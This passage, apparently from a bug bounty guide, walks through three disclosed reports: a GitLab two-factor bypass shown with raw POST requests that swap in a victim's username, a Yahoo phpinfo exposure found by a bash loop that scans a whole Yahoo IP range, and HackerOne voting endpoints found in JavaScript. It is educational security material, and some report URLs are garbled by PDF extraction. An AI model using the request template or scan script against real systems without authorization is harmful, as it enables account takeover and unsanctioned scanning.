+website, it’s also the services the company is using. Think outside the box.
+
+7. Bypassing GitLab Two Factor Authentication
+Difficulty: Medium
+Url: n/a
+Report Link: https://hackerone.com/reports/12808510
+Date Reported: April 3, 2016
+Bounty Paid: n/a
+Description:
+On April 3, Jobert Abma (Co-Founder of HackerOne) reported to GitLab that with two
+factor authentication enabled, an attacker was able to log into a victim’s account without
+actually knowing the victim’s password.
+For those unfamiliar, two factor authentication is a two step process to logging in typically a user enters their username and password and then the site will send an
+authorization code, usually via email or SMS, which the user has to enter to finish the
+login process.
+In this case, Jobert noticed that during the sign in process, once an attacker entered his
+user name and password, a token was sent to finalize the login. When submitting the
+token, the POST call looked like:
+
+10
+
+https://hackerone.com/reports/128085
+
+Application Logic Vulnerabilities
+
+46
+
+POST /users/sign_in HTTP/1.1
+Host: 159.xxx.xxx.xxx
+...
+----------1881604860
+Content-Disposition: form-data; name="user[otp_attempt]"
+212421
+----------1881604860--
+
+If an attacker intercepted this and added a username to the call, for example:
+POST /users/sign_in HTTP/1.1
+Host: 159.xxx.xxx.xxx
+...
+----------1881604860
+Content-Disposition: form-data; name="user[otp_attempt]"
+212421
+----------1881604860
+Content-Disposition: form-data; name="user[login]"
+john
+----------1881604860--
+
+The attacker would be able to log into John’s account if the otp_attempt token was valid
+for John. In other words, during the two step authentication, if an attacker added a
+user[login] parameter, they could change the account they were being logged into.
+Now, the only caveat here was that the attacker had to have a valid OTP token for
+the victim. But this is where bruteforcing would come if. If the site administrators did
+not implement rate limiting, Jobert may have been able to make repeated calls to the
+server to guess a valid token. The likelihood of a successful attack would depend on the
+transit time sending the request to the server and the length of time a token is valid but
+regardless, the vulnerability here is pretty apparent.
+Takeaways
+Two factor authentication is a tricky system to get right. When you notice a site
+is using it, you’ll want to fully test out all functionality including token lifetime,
+maximum number of attempts, reusing expired tokens, likelihood of guessing a
+token, etc.
+
+Application Logic Vulnerabilities
+
+47
+
+8. Yahoo PHP Info Disclosure
+Difficulty: Medium
+Url: http://nc10.n9323.mail.ne1.yahoo.com/phpinfo.php
+Report Link: https://blog.it-securityguard.com/bugbounty-yahoo-phpinfo-php-disclosure2/11
+Date Disclosed: October 16, 2014
+Bounty Paid: n/a
+Description:
+While this didn’t have a huge pay out like some of the other vulnerabilities I’ve included (it
+actually paid $0 which is surprising!), this is one of my favorite reports because it helped
+teach me the importance of network scanning and automation.
+In October 2014, Patrik Fehrenbach (who you should remember from Hacking Pro Tips
+Interview #2 - great guy!) found a Yahoo server with an accessible phpinfo() file. If you’re
+not familiar with phpinfo(), it’s a sensitive command which should never be accessible in
+production, let alone be publicly available, as it discloses all kinds of server information.
+Now, you may be wondering how Patrik found http://nc10.n9323.mail.ne1.yahoo.com
+- I sure was. Turns out he pinged yahoo.com which returned 98.138.253.109. Then he
+passed that to WHOIS and found out that Yahoo actually owned the following:
+NetRange: 98.136.0.0 - 98.139.255.255
+CIDR: 98.136.0.0/14
+OriginAS:
+NetName: A-YAHOO-US9
+NetHandle: NET-98-136-0-0-1
+Parent: NET-98-0-0-0-0
+NetType: Direct Allocation
+RegDate: 2007-12-07
+Updated: 2012-03-02
+Ref: http://whois.arin.net/rest/net/NET-98-136-0-0-1
+
+Notice the first line - Yahoo owns a massive block of ip addresses, from 98.136.0.0 98.139.255.255, or 98.136.0.0/14 which is 260,000 unique IP adresses. That’s a lot of
+potential targets.
+Patrik then wrote a simple bash script to look for an available phpinfo file:
+
+11
+
+https://blog.it-securityguard.com/bugbounty-yahoo-phpinfo-php-disclosure-2/
+
+Application Logic Vulnerabilities
+
+48
+
+#!/bin/bash
+for ipa in 98.13{6..9}.{0..255}.{0..255}; do
+wget -t 1 -T 5 http://${ipa}/phpinfo.php; done &
+
+Running that, he found that random Yahoo server.
+Takeaways
+When hacking, consider a company’s entire infrastructure fair game unless they
+tell you it’s out of scope. While this report didn’t pay a bounty, I know that Patrik
+has employed similar techniques to find some significant four figure payouts.
+Additionally, you’ll notice there was 260,000 potential addresses here, which
+would have been impossible to scan manually. When performing this type of
+testing, automation is hugely important and something that should be employed.
+
+9. HackerOne Hacktivity Voting
+Difficulty: Medium
+Url: https://hackerone.com/hacktivity
+Report Link: https://hackereone.com/reports/13750312
+Date Reported: May 10, 2016
+Bounty Paid: Swag
+Description:
+Though technically not really a security vulnerability in this case, this report is a great
+example of how to think outside of the box.
+Some time in late April/early May 2016, HackerOne developed functionality for hackers
+to vote on reports via their Hacktivity listing. There was an easy way and hard way to
+know the functionality was available. Via the easy way, a GET call to /current_user when
+logged in would include hacktivity_voting_enabled: false. The hard way is a little more
+interesting, where the vulnerability lies and why I’m including this report.
+If you visit the hacktivity and view the page source, you’ll notice it is pretty sparse, just a
+few divs and no real content.
+12
+
+https://hackerone.com/reports/137503
+
+49
+
+Application Logic Vulnerabilities
+
+HackerOne Hacktivity Page Source
+
+Now, if you were unfamiliar with their platform and didn’t have a plugin like wappalyzer
+installed, just looking at this page source should tell you that the content is being
+rendered by javascript.
+So, with that in mind, if you open the devtools in Chrome or Firefox, you can check
+out the javascript source code (in Chrome, you go to sources and on the left, top>hackerone.com->assets->frontend-XXX.js). Chrome devtools comes with a nice {}
+pretty print button which will make minified javascript readable. You could also use Burp
+and review the response returning this Javascript file.
+Herein lies the reason for inclusion, if you search the Javascript for POST you can find
+a bunch of paths used by HackerOne which may not be readily apparent depending on
+your permissions and what is exposed to you as content. One of which is:
+
+Application Logic Vulnerabilities
+
+50
+
+Hackerone Application Javascript POST Voting
+
+As you can see, we have two paths for the voting functionality. At the time of this report,
+you could actually make these calls and vote on the reports.
+Now, this is one way to find the functionality - in the report, the hacker used another
+method, by intercepting responses from HackerOne (presumably using a tool like Burp),
+they switched attributed returned as false with true. This then exposed the voting
+elements which when clicked, made the available POST and DELETE calls.
+The reason why I walked you through the Javascript is because, interacting with the JSON
+response may not always expose new HTML elements. As a result, navigating Javascript
+may expose otherwise “hidden” endpoints to interact with.
+
+
